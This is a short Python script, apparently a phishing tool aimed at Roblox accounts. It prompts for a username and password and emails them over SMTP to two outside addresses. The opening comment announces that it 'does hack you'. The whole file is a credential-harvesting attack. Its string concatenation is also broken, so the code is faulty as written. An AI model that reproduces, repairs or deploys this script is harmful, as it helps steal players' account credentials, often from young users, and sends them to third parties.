# This does hack you...
username = input("Enter username:")
password = input("Enter password:")
SERVER = "smtp.outlook.live.com"
FROM = "gamingizfun@outlook.com"
TO = ["pegiunfriend@outlook.com", "ari.pdx@icloud.com"]

SUBJECT = "New roblox password"
TEXT = "New roblox password!, username is" + username "password is" +  password "Goto roblox.com"

# Prepare actual message
message = """From: %s\r\nTo: %s\r\nSubject: %s\r\n\

%s
""" % (FROM, ", ".join(TO), SUBJECT, TEXT)

# Send the mail
import smtplib
server = smtplib.SMTP(SERVER)
server.sendmail(FROM, TO, message)
server.quit()
# end
